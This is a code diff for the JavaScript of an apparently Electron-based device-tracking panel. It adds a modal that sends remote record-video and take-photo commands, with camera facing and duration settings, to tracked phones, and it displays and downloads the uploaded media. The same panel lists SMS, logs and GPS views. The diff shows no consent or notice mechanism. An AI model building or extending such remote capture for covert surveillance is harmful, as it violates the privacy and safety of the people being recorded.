@@ -13,6 +13,7 @@
   var listenersRegistered = false;
   var selectedDeviceId = "";
   var expandedDeviceId = "";
+  var backendHttpBaseUrl = '';
 
   var getEl = shared.getEl || function (id) { return document.getElementById(id); };
   var toNum = shared.toNum || function (v) { var n = Number(v); return Number.isFinite(n) ? n : null; };
@@ -193,7 +194,7 @@
           + "<div class=\"tracking-device-actions\">"
           + "<button type=\"button\" class=\"tracking-action-btn tracking-action-toggle\" data-action=\"toggle_actions\" data-device-id=\"" + device.deviceId + "\" style=\"display:block;width:100%;\">Actions " + (isExpanded ? "&#9650;" : "&#9660;") + "</button>"
           + "<div class=\"tracking-device-dropdown\" style=\"margin-top:6px;display:" + (isExpanded ? "grid" : "none") + ";gap:6px;\">"
-          + "<button type=\"button\" class=\"tracking-action-btn\" data-action=\"show_camera\" data-device-id=\"" + device.deviceId + "\" style=\"display:block;\">Show Camera</button>"
+          + "<button type=\"button\" class=\"tracking-action-btn\" data-action=\"record_video\" data-device-id=\"" + device.deviceId + "\" style=\"display:block;\">Send Record Command</button>"
           + "<button type=\"button\" class=\"tracking-action-btn\" data-action=\"show_sms\" data-device-id=\"" + device.deviceId + "\" style=\"display:block;\">Show SMS</button>"
           + "<button type=\"button\" class=\"tracking-action-btn\" data-action=\"show_logs\" data-device-id=\"" + device.deviceId + "\" style=\"display:block;\">Show Logs</button>"
           + "</div>"
@@ -356,24 +357,9 @@
           return;
         }
         if (deviceId && window.electronAPI && typeof window.electronAPI.invoke === "function") {
-          if (action === 'show_camera') {
+          if (action === 'show_camera' || action === 'record_video') {
             openCameraModal(deviceId);
-            // backend uses take_photo for camera capture
-            window.electronAPI.invoke("send-command", deviceId, 'take_photo', {}).then(function (result) {
-              var placeholder = document.getElementById('cameraPlaceholder');
-              if (!placeholder) { return; }
-              if (result && result.success && result.data && result.data.queued) {
-                placeholder.textContent = 'Camera request queued by backend. If mobile is currently active, wait a few seconds for the response.';
-              } else {
-                placeholder.textContent = 'Camera command sent. Waiting for image payload...';
-              }
-            }).catch(function (err) {
-              var placeholder = document.getElementById('cameraPlaceholder');
-              if (placeholder) {
-                placeholder.textContent = 'Failed to request camera: ' + (err && err.message ? err.message : err);
-              }
-              console.warn("[Panel] Failed to send " + action + ":", err && err.message ? err.message : err);
-            });
+            return;
           } else {
             window.electronAPI.invoke("send-command", deviceId, action, {}).catch(function (err) {
               console.warn("[Panel] Failed to send " + action + ":", err && err.message ? err.message : err);
@@ -399,6 +385,14 @@
   renderCards();
   renderGpsLog();
 
+  if (window.backendBridge && typeof window.backendBridge.getHttpBaseUrl === 'function') {
+    window.backendBridge.getHttpBaseUrl().then(function (url) {
+      backendHttpBaseUrl = String(url || '').trim().replace(/\/+$/, '');
+    }).catch(function () { backendHttpBaseUrl = ''; });
+  }
+
+  var cameraModalState = { deviceId: '', lastVideoUrl: '', lastImageUrl: '', toastTimer: null };
+
   /* Camera modal UI */
   function createCameraModal() {
     if (document.getElementById('cameraModal')) return;
@@ -415,9 +409,34 @@
     modal.style.justifyContent = 'center';
     modal.style.zIndex = '9999';
 
+    if (!document.getElementById('cameraModalStyles')) {
+      var styleEl = document.createElement('style');
+      styleEl.id = 'cameraModalStyles';
+      styleEl.textContent =
+        '@keyframes cameraStaticShift {'
+        + '0% { background-position: 0% 0%; }'
+        + '50% { background-position: 0% 100%; }'
+        + '100% { background-position: 0% 0%; }'
+        + '}'
+        + '@keyframes cameraPulse {'
+        + '0%, 100% { transform: scale(1); opacity: 0.7; }'
+        + '50% { transform: scale(1.2); opacity: 1; }'
+        + '}'
+        + '.camera-modal-frame { width: 94%; max-width: 980px; max-height: 92vh; overflow: auto; }'
+        + '.camera-modal-frame .cam-cell { min-height: 50px; }'
+        + '@media (max-width: 900px) {'
+        + '.camera-modal-frame { width: 96%; padding: 12px; max-height: 94vh; }'
+        + '.camera-modal-frame .cam-cell { min-height: 50px; }'
+        + '}';
+      document.head.appendChild(styleEl);
+    }
+
     var frame = document.createElement('div');
-    frame.style.width = '90%';
-    frame.style.maxWidth = '1100px';
+    frame.className = 'camera-modal-frame';
+    frame.style.width = '94%';
+    frame.style.maxWidth = '980px';
+    frame.style.maxHeight = '92vh';
+    frame.style.overflow = 'auto';
     frame.style.background = '#0f1620';
     frame.style.padding = '14px';
     frame.style.borderRadius = '10px';
@@ -456,15 +475,105 @@
     header.appendChild(title);
     header.appendChild(closeWrap);
 
+    var settings = document.createElement('div');
+    settings.style.display = 'grid';
+    settings.style.gridTemplateColumns = 'repeat(auto-fit, minmax(160px, 1fr))';
+    settings.style.gap = '10px';
+
+    var facingWrap = document.createElement('label');
+    facingWrap.style.display = 'grid';
+    facingWrap.style.gap = '6px';
+    facingWrap.style.color = '#cbd5f5';
+    facingWrap.style.fontSize = '12px';
+    facingWrap.textContent = 'Camera Facing';
+
+    var facingSelect = document.createElement('select');
+    facingSelect.id = 'cameraFacingSelect';
+    facingSelect.style.background = '#0b1220';
+    facingSelect.style.border = '1px solid #334155';
+    facingSelect.style.color = '#e2e8f0';
+    facingSelect.style.borderRadius = '8px';
+    facingSelect.style.padding = '8px';
+    var facingFront = document.createElement('option');
+    facingFront.value = 'front';
+    facingFront.textContent = 'Front';
+    var facingBack = document.createElement('option');
+    facingBack.value = 'back';
+    facingBack.textContent = 'Back';
+    facingSelect.appendChild(facingFront);
+    facingSelect.appendChild(facingBack);
+    facingWrap.appendChild(facingSelect);
+
+    var durationWrap = document.createElement('label');
+    durationWrap.style.display = 'grid';
+    durationWrap.style.gap = '6px';
+    durationWrap.style.color = '#cbd5f5';
+    durationWrap.style.fontSize = '12px';
+    durationWrap.textContent = 'Duration (seconds)';
+
+    var durationInput = document.createElement('input');
+    durationInput.id = 'cameraDurationSeconds';
+    durationInput.type = 'number';
+    durationInput.min = '1';
+    durationInput.max = '60';
+    durationInput.step = '1';
+    durationInput.value = '15';
+    durationInput.style.background = '#0b1220';
+    durationInput.style.border = '1px solid #334155';
+    durationInput.style.color = '#e2e8f0';
+    durationInput.style.borderRadius = '8px';
+    durationInput.style.padding = '8px';
+    durationWrap.appendChild(durationInput);
+
+    settings.appendChild(facingWrap);
+    settings.appendChild(durationWrap);
+
+    var videoStage = document.createElement('div');
+    videoStage.id = 'cameraModalVideoStage';
+    videoStage.className = 'cam-cell is-offline';
+    videoStage.style.minHeight = '180px';
+    videoStage.style.maxHeight = '70vh';
+
+    var videoFeed = document.createElement('div');
+    videoFeed.className = 'cam-feed';
+
+    var videoPlaceholder = document.createElement('div');
+    videoPlaceholder.className = 'cam-placeholder';
+    videoPlaceholder.textContent = 'Waiting for the request';
+
+    var videoOverlay = document.createElement('div');
+    videoOverlay.className = 'cam-overlay';
+
+    var videoCorner = document.createElement('div');
+    videoCorner.className = 'cam-corner';
+    var videoDot = document.createElement('span');
+    videoDot.className = 'cam-dot';
+    videoCorner.appendChild(videoDot);
+
+    var videoLabel = document.createElement('div');
+    videoLabel.className = 'cam-label';
+    var videoName = document.createElement('div');
+    videoName.className = 'cam-name';
+    videoName.textContent = 'Video feed';
+    var videoStatus = document.createElement('div');
+    videoStatus.className = 'cam-status offline';
+    videoStatus.textContent = 'offline';
+    videoLabel.appendChild(videoName);
+    videoLabel.appendChild(videoStatus);
+
+    videoFeed.appendChild(videoPlaceholder);
+    videoStage.appendChild(videoFeed);
+    videoStage.appendChild(videoOverlay);
+    videoStage.appendChild(videoCorner);
+    videoStage.appendChild(videoLabel);
+
     var imgWrap = document.createElement('div');
-    imgWrap.style.display = 'flex';
-    imgWrap.style.alignItems = 'center';
-    imgWrap.style.justifyContent = 'center';
-    imgWrap.style.background = '#000';
-    imgWrap.style.borderRadius = '6px';
-    imgWrap.style.overflow = 'hidden';
+    imgWrap.className = 'cam-cell is-offline';
     imgWrap.style.minHeight = '180px';
     imgWrap.style.maxHeight = '70vh';
+
+    var imgFeed = document.createElement('div');
+    imgFeed.className = 'cam-feed';
 
     var img = document.createElement('img');
     img.id = 'cameraModalImg';
@@ -476,30 +585,411 @@
 
     var placeholder = document.createElement('div');
     placeholder.id = 'cameraPlaceholder';
-    placeholder.style.color = '#ccc';
-    placeholder.style.padding = '28px';
-    placeholder.textContent = 'Waiting for camera frame...';
+    placeholder.className = 'cam-placeholder';
+    placeholder.textContent = 'Waiting for the request';
 
-    imgWrap.appendChild(img);
-    imgWrap.appendChild(placeholder);
+    var imgOverlay = document.createElement('div');
+    imgOverlay.className = 'cam-overlay';
+
+    var imgCorner = document.createElement('div');
+    imgCorner.className = 'cam-corner';
+    var imgDot = document.createElement('span');
+    imgDot.className = 'cam-dot';
+    imgCorner.appendChild(imgDot);
+
+    var imgLabel = document.createElement('div');
+    imgLabel.className = 'cam-label';
+    var imgName = document.createElement('div');
+    imgName.className = 'cam-name';
+    imgName.textContent = 'Capture frame';
+    var imgStatus = document.createElement('div');
+    imgStatus.className = 'cam-status offline';
+    imgStatus.textContent = 'offline';
+    imgLabel.appendChild(imgName);
+    imgLabel.appendChild(imgStatus);
+
+    imgFeed.appendChild(img);
+    imgFeed.appendChild(placeholder);
+    imgWrap.appendChild(imgFeed);
+    imgWrap.appendChild(imgOverlay);
+    imgWrap.appendChild(imgCorner);
+    imgWrap.appendChild(imgLabel);
+
+    var capturedStatus = document.createElement('div');
+    capturedStatus.id = 'cameraModalCapturedStatus';
+    capturedStatus.style.display = 'flex';
+    capturedStatus.style.alignItems = 'center';
+    capturedStatus.style.justifyContent = 'space-between';
+    capturedStatus.style.background = '#0b1220';
+    capturedStatus.style.border = '1px solid #1f2937';
+    capturedStatus.style.borderRadius = '8px';
+    capturedStatus.style.padding = '10px 12px';
+    capturedStatus.style.color = '#cbd5f5';
+    capturedStatus.style.fontSize = '12px';
+    var capturedLabel = document.createElement('div');
+    capturedLabel.id = 'cameraModalCapturedLabel';
+    capturedLabel.textContent = 'Captured Image: waiting for capture...';
+
+    var imageMeta = document.createElement('div');
+    imageMeta.style.display = 'flex';
+    imageMeta.style.alignItems = 'center';
+    imageMeta.style.gap = '8px';
+
+    var imageName = document.createElement('div');
+    imageName.id = 'cameraModalImageName';
+    imageName.style.color = '#cbd5f5';
+    imageName.style.fontSize = '12px';
+    imageName.style.display = 'none';
+
+    var imageDownload = document.createElement('a');
+    imageDownload.id = 'cameraModalImageDownload';
+    imageDownload.textContent = 'Download image';
+    imageDownload.style.background = '#1d4ed8';
+    imageDownload.style.color = '#fff';
+    imageDownload.style.borderRadius = '6px';
+    imageDownload.style.padding = '4px 8px';
+    imageDownload.style.textDecoration = 'none';
+    imageDownload.style.display = 'none';
+
+    imageMeta.appendChild(imageName);
+    imageMeta.appendChild(imageDownload);
+    capturedStatus.appendChild(capturedLabel);
+    capturedStatus.appendChild(imageMeta);
+
+    var recordedStatus = document.createElement('div');
+    recordedStatus.id = 'cameraModalRecordedStatus';
+    recordedStatus.style.display = 'flex';
+    recordedStatus.style.alignItems = 'center';
+    recordedStatus.style.justifyContent = 'space-between';
+    recordedStatus.style.background = '#0b1220';
+    recordedStatus.style.border = '1px solid #1f2937';
+    recordedStatus.style.borderRadius = '8px';
+    recordedStatus.style.padding = '10px 12px';
+    recordedStatus.style.color = '#cbd5f5';
+    recordedStatus.style.fontSize = '12px';
+    recordedStatus.textContent = 'Recorded Video: waiting for upload...';
+
+    var videoWrap = document.createElement('div');
+    videoWrap.id = 'cameraModalVideoWrap';
+    videoWrap.style.background = '#0b1220';
+    videoWrap.style.border = '1px solid #1f2937';
+    videoWrap.style.borderRadius = '8px';
+    videoWrap.style.padding = '10px';
+    videoWrap.style.display = 'none';
+
+    var video = document.createElement('video');
+    video.id = 'cameraModalVideo';
+    video.controls = true;
+    video.preload = 'metadata';
+    video.style.width = '100%';
+    video.style.borderRadius = '6px';
+    video.style.background = '#000';
+
+    var downloadWrap = document.createElement('div');
+    downloadWrap.style.display = 'flex';
+    downloadWrap.style.justifyContent = 'flex-end';
+    downloadWrap.style.marginTop = '8px';
+    downloadWrap.style.gap = '8px';
+    downloadWrap.style.alignItems = 'center';
+
+    var filename = document.createElement('div');
+    filename.id = 'cameraModalFilename';
+    filename.style.color = '#cbd5f5';
+    filename.style.fontSize = '12px';
+    filename.style.display = 'none';
+
+    var download = document.createElement('a');
+    download.id = 'cameraModalDownload';
+    download.textContent = 'Download video';
+    download.style.background = '#1d4ed8';
+    download.style.color = '#fff';
+    download.style.borderRadius = '6px';
+    download.style.padding = '6px 10px';
+    download.style.textDecoration = 'none';
+    download.style.display = 'none';
+    downloadWrap.appendChild(filename);
+    downloadWrap.appendChild(download);
+
+    videoWrap.appendChild(video);
+    videoWrap.appendChild(downloadWrap);
 
     var footer = document.createElement('div');
     footer.style.display = 'flex';
-    footer.style.justifyContent = 'flex-end';
+    footer.style.justifyContent = 'space-between';
+    footer.style.alignItems = 'center';
+    footer.style.gap = '12px';
+
+    var hint = document.createElement('div');
+    hint.id = 'cameraModalHint';
+    hint.style.color = '#94a3b8';
+    hint.style.fontSize = '12px';
+    hint.textContent = 'Set duration, then send a recording command.';
+
+    var send = document.createElement('button');
+    send.id = 'cameraModalSend';
+    send.textContent = 'Send Record Command';
+    send.style.background = '#2563eb';
+    send.style.color = '#fff';
+    send.style.border = 'none';
+    send.style.padding = '8px 12px';
+    send.style.borderRadius = '8px';
+    send.style.cursor = 'pointer';
+    send.addEventListener('click', function () {
+      var targetId = cameraModalState.deviceId;
+      if (!targetId) return;
+      sendRecordCommand(targetId);
+    });
+
+    var capture = document.createElement('button');
+    capture.id = 'cameraModalCapture';
+    capture.textContent = 'Send Capture Command';
+    capture.style.background = '#0f172a';
+    capture.style.color = '#e2e8f0';
+    capture.style.border = '1px solid #334155';
+    capture.style.padding = '8px 12px';
+    capture.style.borderRadius = '8px';
+    capture.style.cursor = 'pointer';
+    capture.addEventListener('click', function () {
+      var targetId = cameraModalState.deviceId;
+      if (!targetId) return;
+      sendCaptureCommand(targetId);
+    });
+
+    var videoLabel = document.createElement('div');
+    videoLabel.textContent = 'VIDEO';
+    videoLabel.style.color = '#93c5fd';
+    videoLabel.style.fontSize = '12px';
+    videoLabel.style.letterSpacing = '0.12em';
+    videoLabel.style.textTransform = 'uppercase';
+
+    var videoSection = document.createElement('div');
+    videoSection.style.display = 'grid';
+    videoSection.style.gap = '10px';
+
+    var videoActions = document.createElement('div');
+    videoActions.style.display = 'flex';
+    videoActions.style.justifyContent = 'flex-end';
+    videoActions.appendChild(send);
+
+    videoSection.appendChild(videoStage);
+    videoSection.appendChild(recordedStatus);
+    videoSection.appendChild(videoWrap);
+    videoSection.appendChild(videoActions);
+
+    var divider = document.createElement('div');
+    divider.style.height = '1px';
+    divider.style.background = '#1f2937';
+    divider.style.margin = '4px 0';
+
+    var captureLabel = document.createElement('div');
+    captureLabel.textContent = 'CAPTURE';
+    captureLabel.style.color = '#cbd5f5';
+    captureLabel.style.fontSize = '12px';
+    captureLabel.style.letterSpacing = '0.12em';
+    captureLabel.style.textTransform = 'uppercase';
+
+    var captureSection = document.createElement('div');
+    captureSection.style.display = 'grid';
+    captureSection.style.gap = '10px';
+
+    var captureActions = document.createElement('div');
+    captureActions.style.display = 'flex';
+    captureActions.style.justifyContent = 'flex-end';
+    captureActions.appendChild(capture);
+
+    captureSection.appendChild(imgWrap);
+    captureSection.appendChild(capturedStatus);
+    captureSection.appendChild(captureActions);
 
     frame.appendChild(header);
-    frame.appendChild(imgWrap);
+    frame.appendChild(settings);
+    frame.appendChild(videoLabel);
+    frame.appendChild(videoSection);
+    frame.appendChild(divider);
+    frame.appendChild(captureLabel);
+    frame.appendChild(captureSection);
+    footer.appendChild(hint);
     frame.appendChild(footer);
+    var toast = document.createElement('div');
+    toast.id = 'cameraModalToast';
+    toast.style.position = 'absolute';
+    toast.style.right = '24px';
+    toast.style.top = '18px';
+    toast.style.background = 'rgba(30, 64, 175, 0.95)';
+    toast.style.color = '#e2e8f0';
+    toast.style.border = '1px solid rgba(96, 165, 250, 0.5)';
+    toast.style.borderRadius = '10px';
+    toast.style.padding = '10px 14px';
+    toast.style.display = 'flex';
+    toast.style.alignItems = 'center';
+    toast.style.gap = '10px';
+    toast.style.fontSize = '12px';
+    toast.style.fontWeight = '600';
+    toast.style.boxShadow = '0 10px 25px rgba(2, 6, 23, 0.5)';
+    toast.style.display = 'none';
+    frame.appendChild(toast);
     modal.appendChild(frame);
     document.body.appendChild(modal);
   }
 
+  function showCameraModalToast(message) {
+    var toast = document.getElementById('cameraModalToast');
+    if (!toast) { return; }
+
+    toast.textContent = '';
+    var text = document.createElement('div');
+    text.textContent = message;
+    text.style.flex = '1';
+
+    var done = document.createElement('button');
+    done.textContent = 'Done';
+    done.style.background = '#1e3a8a';
+    done.style.color = '#fff';
+    done.style.border = '1px solid rgba(191, 219, 254, 0.35)';
+    done.style.borderRadius = '6px';
+    done.style.padding = '4px 8px';
+    done.style.cursor = 'pointer';
+
+    var close = document.createElement('button');
+    close.textContent = 'Close';
+    close.style.background = 'transparent';
+    close.style.color = '#e2e8f0';
+    close.style.border = '1px solid rgba(148, 163, 184, 0.6)';
+    close.style.borderRadius = '6px';
+    close.style.padding = '4px 8px';
+    close.style.cursor = 'pointer';
+
+    function hideToast() {
+      toast.style.display = 'none';
+      if (cameraModalState.toastTimer) {
+        clearTimeout(cameraModalState.toastTimer);
+        cameraModalState.toastTimer = null;
+      }
+    }
+
+    done.addEventListener('click', hideToast);
+    close.addEventListener('click', hideToast);
+
+    toast.appendChild(text);
+    toast.appendChild(done);
+    toast.appendChild(close);
+    toast.style.display = 'flex';
+
+    if (cameraModalState.toastTimer) {
+      clearTimeout(cameraModalState.toastTimer);
+    }
+    cameraModalState.toastTimer = setTimeout(function () {
+      hideToast();
+    }, 600000);
+  }
+
+  function setCameraModalVideo(url, nameOverride) {
+    var videoWrap = document.getElementById('cameraModalVideoWrap');
+    var video = document.getElementById('cameraModalVideo');
+    var download = document.getElementById('cameraModalDownload');
+    var filename = document.getElementById('cameraModalFilename');
+    var recordedStatus = document.getElementById('cameraModalRecordedStatus');
+    if (!videoWrap || !video || !download) { return; }
+
+    if (url) {
+      var name = '';
+      try {
+        var cleaned = String(url).split('#')[0].split('?')[0];
+        name = cleaned.split('/').pop() || '';
+      } catch (e) { name = ''; }
+      if (nameOverride) { name = String(nameOverride); }
+
+      video.src = url;
+      videoWrap.style.display = 'block';
+      download.href = url;
+      download.setAttribute('download', '');
+      download.style.display = 'inline-flex';
+      if (filename) {
+        filename.textContent = name ? ('File: ' + name) : 'File ready';
+        filename.style.display = 'inline-flex';
+      }
+      if (recordedStatus) {
+        recordedStatus.textContent = name ? ('Recorded Video: ' + name) : 'Recorded Video: ready';
+      }
+      if (cameraModalState.lastVideoUrl !== url) {
+        cameraModalState.lastVideoUrl = url;
+        showCameraModalToast('Recorded video is ready. You can download it now.');
+      }
+      return;
+    }
+
+    video.removeAttribute('src');
+    video.load();
+    videoWrap.style.display = 'none';
+    download.removeAttribute('href');
+    download.style.display = 'none';
+    if (filename) {
+      filename.textContent = '';
+      filename.style.display = 'none';
+    }
+    if (recordedStatus) {
+      recordedStatus.textContent = 'Recorded Video: waiting for upload...';
+    }
+    cameraModalState.lastVideoUrl = '';
+  }
+
+  function setCameraModalImage(url, nameOverride) {
+    var img = document.getElementById('cameraModalImg');
+    var placeholder = document.getElementById('cameraPlaceholder');
+    var imageDownload = document.getElementById('cameraModalImageDownload');
+    var imageName = document.getElementById('cameraModalImageName');
+    var capturedLabel = document.getElementById('cameraModalCapturedLabel');
+
+    if (!img || !imageDownload) { return; }
+
+    if (url) {
+      var name = '';
+      try {
+        var cleaned = String(url).split('#')[0].split('?')[0];
+        name = cleaned.split('/').pop() || '';
+      } catch (e) { name = ''; }
+      if (nameOverride) { name = String(nameOverride); }
+
+      img.src = url;
+      img.style.display = 'block';
+      if (placeholder) { placeholder.style.display = 'none'; }
+      imageDownload.href = url;
+      imageDownload.setAttribute('download', '');
+      imageDownload.style.display = 'inline-flex';
+      if (imageName) {
+        imageName.textContent = name ? ('File: ' + name) : 'Image ready';
+        imageName.style.display = 'inline-flex';
+      }
+      if (capturedLabel) {
+        capturedLabel.textContent = name ? ('Captured Image: ' + name) : 'Captured Image: ready';
+      }
+      cameraModalState.lastImageUrl = url;
+      return;
+    }
+
+    img.removeAttribute('src');
+    img.style.display = 'none';
+    if (placeholder) { placeholder.style.display = 'block'; }
+    imageDownload.removeAttribute('href');
+    imageDownload.style.display = 'none';
+    if (imageName) {
+      imageName.textContent = '';
+      imageName.style.display = 'none';
+    }
+    if (capturedLabel) {
+      capturedLabel.textContent = 'Captured Image: waiting for capture...';
+    }
+    cameraModalState.lastImageUrl = '';
+  }
+
   function openCameraModal(deviceId) {
     createCameraModal();
+    cameraModalState.deviceId = String(deviceId || '').trim();
     var modal = document.getElementById('cameraModal');
     var title = document.getElementById('cameraModalTitle');
     var img = document.getElementById('cameraModalImg');
     var placeholder = document.getElementById('cameraPlaceholder');
+    var hint = document.getElementById('cameraModalHint');
     if (title) title.textContent = 'Camera: ' + deviceId;
     if (img) {
       img.src = ''; // clear
@@ -507,9 +997,94 @@
     }
     if (placeholder) {
       placeholder.style.display = 'block';
+      placeholder.textContent = 'Ready to record. Configure settings and send the command.';
     }
+    if (hint) {
+      hint.textContent = 'Set duration, then send a recording command.';
+    }
+    setCameraModalVideo('');
+    setCameraModalImage('');
     if (modal) modal.style.display = 'flex';
     // request latest frame; backend will forward the camera response if available
+  }
+
+  function sendRecordCommand(deviceId) {
+    var targetId = String(deviceId || '').trim();
+    if (!targetId) return;
+    if (!window.electronAPI || typeof window.electronAPI.invoke !== 'function') {
+      return;
+    }
+    var facing = 'front';
+    var duration = 15;
+    var facingSelect = document.getElementById('cameraFacingSelect');
+    var durationInput = document.getElementById('cameraDurationSeconds');
+    if (facingSelect && facingSelect.value) {
+      facing = String(facingSelect.value || 'front');
+    }
+    if (durationInput && durationInput.value) {
+      duration = Math.max(1, Math.min(60, Number(durationInput.value) || 15));
+    }
+    var placeholder = document.getElementById('cameraPlaceholder');
+    if (placeholder) {
+      placeholder.textContent = 'Sending record command...';
+    }
+    setCameraModalVideo('');
+    window.electronAPI.invoke('send-command', targetId, 'record_video', {
+      camera: facing,
+      facing: facing,
+      duration: duration,
+      duration_seconds: duration,
+      quality: 0.85,
+      source: 'mobile-panel'
+    }).then(function (result) {
+      if (!placeholder) return;
+      if (result && result.success && result.data && result.data.queued) {
+        placeholder.textContent = 'Record command queued by backend. If mobile is currently active, wait a few seconds for the response.';
+      } else {
+        placeholder.textContent = 'Record command sent. Waiting for the recording payload...';
+      }
+    }).catch(function (err) {
+      if (placeholder) {
+        placeholder.textContent = 'Failed to request recording: ' + (err && err.message ? err.message : err);
+      }
+      console.warn('[Panel] Failed to send record_video:', err && err.message ? err.message : err);
+    });
+  }
+
+  function sendCaptureCommand(deviceId) {
+    var targetId = String(deviceId || '').trim();
+    if (!targetId) return;
+    if (!window.electronAPI || typeof window.electronAPI.invoke !== 'function') {
+      return;
+    }
+    var facing = 'front';
+    var facingSelect = document.getElementById('cameraFacingSelect');
+    if (facingSelect && facingSelect.value) {
+      facing = String(facingSelect.value || 'front');
+    }
+    var placeholder = document.getElementById('cameraPlaceholder');
+    if (placeholder) {
+      placeholder.textContent = 'Sending capture command...';
+    }
+    setCameraModalImage('');
+    window.electronAPI.invoke('send-command', targetId, 'take_photo', {
+      camera: facing,
+      facing: facing,
+      quality: 0.9,
+      source: 'mobile-panel'
+    }).then(function (result) {
+      if (!placeholder) return;
+      if (result && result.success && result.data && result.data.queued) {
+        placeholder.textContent = 'Capture command queued by backend. If mobile is currently active, wait a few seconds for the response.';
+      } else {
+        placeholder.textContent = 'Capture command sent. Waiting for image payload...';
+      }
+    }).catch(function (err) {
+      if (placeholder) {
+        placeholder.textContent = 'Failed to request capture: ' + (err && err.message ? err.message : err);
+      }
+      console.warn('[Panel] Failed to send take_photo:', err && err.message ? err.message : err);
+    });
   }
 
   function closeCameraModal() {
@@ -519,6 +1094,92 @@
 
   // Listen for camera frames from main process
   if (window.electronAPI && typeof window.electronAPI.on === 'function') {
+    window.electronAPI.on('backend:event', function (_event, data) {
+      try {
+        if (!data || typeof data !== 'object') { return; }
+        var type = data.type;
+        if (type !== 'command_response' && type !== 'device_event') { return; }
+
+        var action = String(
+          data.action
+          || data.event
+          || (data.payload && (data.payload.action || data.payload.type))
+          || ''
+        ).toLowerCase();
+
+        if (type === 'command_response' && action && action !== 'record_video' && action !== 'take_photo' && action !== 'camera_frame') {
+          return;
+        }
+
+        var fileName =
+          (data.data && (data.data.file_name || data.data.filename || data.data.file))
+          || (data.result && (data.result.file_name || data.result.filename || data.result.file))
+          || (data.payload && (data.payload.file_name || data.payload.filename || data.payload.file))
+          || '';
+
+        var filePath =
+          (data.data && (data.data.path || data.data.file_path))
+          || (data.result && (data.result.path || data.result.file_path))
+          || (data.payload && (data.payload.path || data.payload.file_path))
+          || '';
+
+        var videoUrl =
+          (data.data && (data.data.video_url || data.data.file_url))
+          || (data.result && (data.result.video_url || data.result.file_url))
+          || (data.payload && (data.payload.video_url || data.payload.file_url))
+          || data.video_url
+          || '';
+
+        var imageUrl =
+          (data.data && (data.data.image_url || data.data.photo_url || data.data.file_url))
+          || (data.result && (data.result.image_url || data.result.photo_url || data.result.file_url))
+          || (data.payload && (data.payload.image_url || data.payload.photo_url || data.payload.file_url))
+          || data.image_url
+          || '';
+
+        if (!videoUrl && !imageUrl) {
+          var candidate = String(filePath || fileName || '').trim();
+          if (!candidate) { return; }
+          var normalized = candidate.replace(/^\.+[/\\]/, '').replace(/^[\\/]+/, '');
+          var uploadsIndex = normalized.toLowerCase().indexOf('uploads/');
+          if (uploadsIndex >= 0) {
+            normalized = normalized.slice(uploadsIndex + 'uploads/'.length);
+          }
+          if (!backendHttpBaseUrl) { return; }
+          if (action === 'record_video') {
+            videoUrl = backendHttpBaseUrl + '/uploads/' + normalized;
+          } else {
+            imageUrl = backendHttpBaseUrl + '/uploads/' + normalized;
+          }
+        }
+
+        var deviceId = String(
+          data.device_id
+          || data.deviceId
+          || (data.payload && (data.payload.device_id || data.payload.deviceId))
+          || ''
+        ).trim();
+
+        if (cameraModalState.deviceId && deviceId && cameraModalState.deviceId !== deviceId) { return; }
+
+        createCameraModal();
+        var modal = document.getElementById('cameraModal');
+        var title = document.getElementById('cameraModalTitle');
+        var placeholder = document.getElementById('cameraPlaceholder');
+        var hint = document.getElementById('cameraModalHint');
+        if (title && deviceId) { title.textContent = 'Camera: ' + deviceId; }
+        if (placeholder) { placeholder.style.display = 'none'; }
+        if (action === 'record_video') {
+          if (hint) { hint.textContent = 'Recording ready. Download below.'; }
+          setCameraModalVideo(videoUrl, fileName);
+        } else {
+          if (hint) { hint.textContent = 'Image ready. Download below.'; }
+          setCameraModalImage(imageUrl, fileName);
+        }
+        if (modal) { modal.style.display = 'flex'; }
+      } catch (e) { console.warn('[Panel] backend:event handler error', e); }
+    });
+
     window.electronAPI.on('mobile:camera_frame', function (_event, data) {
       try {
         var deviceId = data && data.deviceId ? String(data.deviceId) : null;
@@ -527,14 +1188,8 @@
         createCameraModal();
         var modal = document.getElementById('cameraModal');
         var title = document.getElementById('cameraModalTitle');
-        var img = document.getElementById('cameraModalImg');
-        var placeholder = document.getElementById('cameraPlaceholder');
         if (title && deviceId) title.textContent = 'Camera: ' + deviceId;
-        if (img) {
-          img.src = 'data:image/jpeg;base64,' + b64;
-          img.style.display = 'block';
-        }
-        if (placeholder) placeholder.style.display = 'none';
+        setCameraModalImage('data:image/jpeg;base64,' + b64, 'camera-frame.jpg');
         if (modal) modal.style.display = 'flex';
       } catch (e) { console.warn('[Panel] camera_frame handler error', e); }
     });
